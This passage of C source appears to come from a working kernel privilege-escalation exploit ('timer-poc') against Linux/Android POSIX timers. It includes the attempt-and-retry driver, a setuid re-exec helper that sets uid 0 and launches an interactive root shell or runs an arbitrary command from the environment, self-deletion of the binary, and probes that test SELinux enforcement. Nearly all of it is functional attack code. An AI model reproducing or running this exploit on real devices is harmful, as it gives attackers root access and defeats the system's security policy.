 * k_itimer objects actually take on this kernel.  Every reclaim step in the
 * chain assumes those frees land inside the grace window; the on-device
 * slabinfo trace showed frees arriving many seconds later, so this isolates
 * the latency with none of the rest of the machinery in the way.
 */
static int ic_rcu_latency_test(unsigned int n)
{
	struct timespec ts = { .tv_nsec = 20000000 };
	struct timespec t0, tn;
	struct sigevent ev;
	unsigned int i;
	int *ids;

	if (!n || n > 20000)
		n = 1000;
	ids = malloc(sizeof(int) * n);
	if (!ids)
		return -1;
	ic_pin_cpu_index(0);
	if (g_sladtrace < 0) {
		char tmp[4096];

		g_sladtrace = open("/proc/slabinfo", O_RDONLY);
		if (g_sladtrace >= 0)
			(void)!read(g_sladtrace, tmp, sizeof tmp);
	}
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	ic_sladb("rcu-pre");
	{
		int nc = 0, nd = 0, lerr = 0;

		for (i = 0; i < n; i++) {
			if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &ev,
				    &ids[i]))
				lerr = errno;
			else
				nc++;
		}
		ic_sladb("rcu-created");
		clock_gettime(CLOCK_MONOTONIC, &t0);
		for (i = 0; i < n; i++) {
			if (syscall(SYS_timer_delete, ids[i]))
				lerr = errno;
			else
				nd++;
		}
		fprintf(stderr, "[rcu] created=%d deleted=%d errno=%d\n",
			nc, nd, lerr);
	}
	for (i = 0; i < 500; i++) {
		long a, t;

		if (!ic_sladb_pair(&a, &t)) {
			long ms;

			clock_gettime(CLOCK_MONOTONIC, &tn);
			ms = (tn.tv_sec - t0.tv_sec) * 1000L +
			     (tn.tv_nsec - t0.tv_nsec) / 1000000L;
			fprintf(stderr, "[rcu] %5ld ms active=%ld total=%ld\n",
				ms, a, t);
		}
		nanosleep(&ts, NULL);
	}
	free(ids);
	return 0;
}

int main(int argc, char **argv)
{
	int launch_pipe[2], done_pipe[2], flags;
	pid_t launcher;
	unsigned int i;
	unsigned int max_attempts = IC_MAX_ATTEMPTS;
	{
		/* Offline harness only: under an enforcing policy the process
		 * may write neither the init's console nor the log file the
		 * init can read back, so the run gets a char device the shell
		 * domain is allowed to use (null_device) and reports there. */
		const char *lp = getenv("IC_LOG_PATH");

		if (lp && *lp) {
			int lfd = open(lp, O_WRONLY | O_APPEND | O_CLOEXEC);

			if (lfd >= 0) {
				(void)dup2(lfd, 1);
				(void)dup2(lfd, 2);
				if (lfd > 2)
					close(lfd);
			}
		}
	}
	{
		/* Only 7 of the 31 arm offsets give a usable L, so a single
		 * try succeeds ~22.6 % of the time; the offline harness and the
		 * on-device driver both want to raise the count. */
		const char *ae = getenv("IC_ATTEMPTS");
		unsigned long v;

		if (ae && (v = strtoul(ae, NULL, 0)) >= 1 && v <= 64)
			max_attempts = (unsigned int)v;
	}
	/* Not in the escalated payload re-exec: that process prints only the
	 * proof lines the harness parses. */
	if (!getenv("IC_SCAN_FD"))
		ic_env_diag();
	{
		const char *rt = getenv("IC_RCUTEST");

		if (rt) {
			int rc = ic_rcu_latency_test((unsigned int)strtoul(rt, NULL, 0));

			return rc ? 1 : 0;
		}
	}

	/* The launcher execs the escalated copy with argv[0] == "timer-poc".
	 * Printing euid/uid here is the offline proof that the setuid bit and
	 * the fake fsuid did their job (euid 0 over ruid 1000, or plain root
	 * when the harness itself runs as root). */
	if (argc > 0 && argv[0] &&
	    (!strcmp(argv[0], "timer-poc") || getenv("IC_SCAN_FD"))) {
		const char *ack = getenv("IC_SCAN_FD");
		const char *probe = getenv("IC_SCAN_PROBE");
		char ctx[96];
		ssize_t cn = -1;
		int probe_err = 0;
		int cfd;

		/* An exec alone only proves the candidate may execute the
		 * payload; the shell domain does that too.  IC_SCAN_PROBE names
		 * a file whose label the shell domain cannot open, so a
		 * successful open is something shell cannot do: either the
		 * candidate has an explicit allow or its domain is permissive.
		 * (A CAP_SETUID probe cannot be used here: __sys_setresuid
		 * still succeeds when the new uid equals old->fsuid, which the
		 * fake cred sets to 0.) */
		if (probe && *probe) {
			/* The comm only survives in the AVC audit line of the
			 * write below; it is how the harness reads this verdict
			 * once the console is closed to us. */
			(void)prctl(PR_SET_NAME, "probe", 0UL, 0UL, 0UL);
			cfd = open(probe, O_WRONLY | O_CLOEXEC);
			if (cfd < 0)
				probe_err = errno;
			else
				close(cfd);
			(void)prctl(PR_SET_NAME,
				    probe_err ? (probe_err == EACCES ?
						 "probedeny" : "probeerr") :
						"probeok", 0UL, 0UL, 0UL);
		}
		/* Harness: force one denied console write so the audit line
		 * carries the probe errno as comm (p0 = open passed). */
		{
			char nm[16];

			snprintf(nm, sizeof(nm), "p%d", probe_err);
			(void)prctl(PR_SET_NAME, nm, 0UL, 0UL, 0UL);
			(void)syscall(SYS_write, 2, "P", 1);
		}
		cfd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
		if (cfd >= 0) {
			cn = read(cfd, ctx, sizeof(ctx) - 1);
			close(cfd);
		}
		if (cn > 0) {
			while (cn > 0 && (ctx[cn - 1] == '\n' ||
					  ctx[cn - 1] == '\0'))
				cn--;
			ctx[cn] = '\0';
		}
		fprintf(stderr, "[helper] launched euid=%d uid=%d probe_err=%d ctx=%s\n",
			(int)geteuid(), (int)getuid(), probe_err,
			cn > 0 ? ctx : "?");
		fflush(stderr);
		/* Tell the scanning winner that execve() reached this image and
		 * (in probe mode) that the privileged open passed.  The fd and
		 * its number come from the environment because the pipe is
		 * inherited across exec (not CLOEXEC).  Four bytes of errno is
		 * a verdict about the candidate, not an exec failure. */
		if (ack) {
			int afd = atoi(ack);
			long awr;
			int awe;

			if (probe_err) {
				int v = (int)(IC_SCAN_VERDICT |
					      (unsigned int)(probe_err & 0xffff));

				awr = write(afd, &v, sizeof(v));
			} else {
				awr = write(afd, "K", 1);
			}
			awe = errno;
			/* Harness: a1_0 = 'K' went through, a-1_13 = the
			 * pipe write itself was denied (EACCES).  Under
			 * enforcement only the audit comm survives. */
			{
				char nm[16];

				snprintf(nm, sizeof(nm), "a%d_%d", (int)awr,
					 awe);
				(void)prctl(PR_SET_NAME, nm, 0UL, 0UL, 0UL);
				(void)syscall(SYS_write, 2, "A", 1);
			}
		}
		if (!geteuid() && getuid()) {
			char *const shenv[] = {
				(char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
				(char *)"HOME=/", (char *)"TERM=xterm", NULL
			};
			char *const shargv[] = { (char *)"sh", (char *)"-i", NULL };
			const char *pc = getenv("IC_PAYLOAD_CMD");

			/* Device endgame: run one bounded command instead of an
			 * interactive shell.  adb shell has no tty for sh -i, and
			 * the command's output on the inherited stderr is the only
			 * proof that survives a scontext that may not write files.
			 * The ack above has already been sent, so the drop parent
			 * is only waiting for this process to exit. */
			if (pc && *pc) {
				char *const cargv[] = { (char *)"sh", (char *)"-c",
							(char *)pc, NULL };

				if (getuid())
					(void)setresgid(0, 0, 0);
				if (getuid())
					(void)setresuid(0, 0, 0);
				fprintf(stderr,
					"[helper] cmd euid=%d uid=%d ctx=%s\n",
					(int)geteuid(), (int)getuid(),
					cn > 0 ? ctx : "?");
				fflush(stderr);
				execve("/system/bin/sh", cargv, shenv);
				execve("/bin/sh", cargv, shenv);
			}
			(void)unlink("/proc/self/exe");
			if (!setresgid(0, 0, 0) && !setresuid(0, 0, 0)) {
				fprintf(stderr, "[helper] setresuid(0,0,0) ok\n");
				fflush(stderr);
				execve("/system/bin/sh", shargv, shenv);
				execve("/bin/sh", shargv, shenv);
			}
		}
		_exit(0);
	}

	if (!geteuid() && getuid()) {
		char *const shenv[] = {
			(char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
			(char *)"HOME=/", (char *)"TERM=xterm", NULL
		};
		char *const shargv[] = { (char *)"sh", (char *)"-i", NULL };
		char self[PATH_MAX];
		ssize_t n = readlink("/proc/self/exe", self, sizeof(self) - 1);

		if (n > 0) {
			self[n] = '\0';
			(void)unlink(self);
		}
		if (setresgid(0, 0, 0) || setresuid(0, 0, 0))
			_exit(126);
		execve("/system/bin/sh", shargv, shenv);
		execve("/bin/sh", shargv, shenv);
		_exit(127);
	}

	if (ic_is_reexec_image())
		_exit(42);

	/* Inherited by every fork and thread.  A write to the launcher pipe
	 * after the launcher execve()d (and the helper exited) must fail with
	 * EPIPE instead of raising SIGPIPE, which would exit_group() the
	 * whole exploit process and reap the winner's corrupted base. */
	(void)signal(SIGPIPE, SIG_IGN);

	if (getenv("IC_DUMPPT")) {
		ic_dump_file("/proc/pagetypeinfo", "pagetypeinfo");
		ic_dump_file("/proc/buddyinfo", "buddyinfo");
	}

	if (getenv("IC_PAGEPROBE"))
		return ic_pageprobe();

	if (getenv("IC_DRAIN")) {
		ic_capture_cpu_map();
		return ic_drain_probe();
	}

	if (getenv("IC_REAP"))
		return ic_reap_main();

	ic_capture_cpu_map();
	{
		const char *sd = getenv("IC_STAGING_DIR");

		if (sd && *sd) {
			snprintf(g_staging_dir, sizeof(g_staging_dir), "%s", sd);
		} else if (ic_pick_staging_dir(g_staging_dir,
					       sizeof(g_staging_dir))) {
			return 1;
		}
	}
	if (pipe(launch_pipe) || pipe(done_pipe))
		return 1;
	g_launch_wfd = launch_pipe[1];
	flags = fcntl(done_pipe[0], F_GETFL, 0);
	(void)fcntl(done_pipe[0], F_SETFL, flags | O_NONBLOCK);

	launcher = fork();
	if (launcher < 0)
		return 1;
	if (launcher == 0) {
		close(launch_pipe[1]);
		close(done_pipe[0]);
		close(done_pipe[1]);
		ic_run_launcher(launch_pipe[0]);
	}
	close(launch_pipe[0]);
	g_retry_fd = done_pipe[1];

	for (i = 0; i < max_attempts; i++) {
		pid_t child = fork();
		unsigned int waited = 0;
		unsigned int max_wait = 450;
		const char *aw = getenv("IC_ATTEMPT_WAIT");
		int st;
		int peak = getenv("IC_PEAK") != NULL;

		if (aw)
			max_wait = (unsigned int)strtoul(aw, NULL, 0);
		if (child < 0)
			return 1;
		if (child == 0) {
			close(done_pipe[0]);
			if ((peak ? ic_peak_attempt() : ic_run_attempt()) == 0) {
				(void)!write(done_pipe[1], "1", 1);
				if (peak) {
					fprintf(stderr, "[peak] attempt done, "
						"helper is running\n");
					fflush(stderr);
					/* Never exit here: the winner task's SCHED
					 * base still has the bogus node at X+0x10
					 * as its cached leftmost, and release_task()
					 * would walk it (rb_next on a cred field)
					 * and oops the kernel before the launcher
					 * gets to run the helper. */
					for (;;)
						pause();
				}
				for (;;)
					pause();
			}
			_exit(1);
		}
		for (;;) {
			struct timespec poll = { .tv_nsec = 200 * 1000 * 1000 };
			char completion;

			if (read(done_pipe[0], &completion, 1) == 1) {
				if (completion == 'R') {
					/* The attempt parked with X in its psl
					 * (unsupported offset or a post-leak
					 * failure).  It never exits, so fork a
					 * fresh one right away instead of waiting
					 * out the attempt watchdog. */
					fprintf(stderr,
						"[peak] attempt %u parked, retrying\n",
						i);
					fflush(stderr);
					break;
				}
				if (peak) {
					/* Give the launcher a moment to exec the
					 * setuid copy and print its proof line. */
					struct timespec settle = { .tv_sec = 3 };

					nanosleep(&settle, NULL);
					return 0;
				}
				for (;;)
					pause();
			}
			if (waitpid(child, &st, WNOHANG) == child)
				break;
			/* A worker stuck in the kernel firing loop cannot be
			 * killed; stop waiting for it and try a fresh attempt. */
			if (++waited > max_wait) {
				fprintf(stderr,
					"[peak] attempt %u not done after %ums, forking another\n",
					i, max_wait * 200);
				fflush(stderr);
				break;
			}
			nanosleep(&poll, NULL);
		}
		if (getenv("IC_PEAK_DIAG")) {
			fprintf(stderr, "[peak] diag stop (parent)\n");
			fflush(stderr);
			return 0;
		}
	}
	fprintf(stderr, "no root after %u attempts\n", max_attempts);
	return 2;
}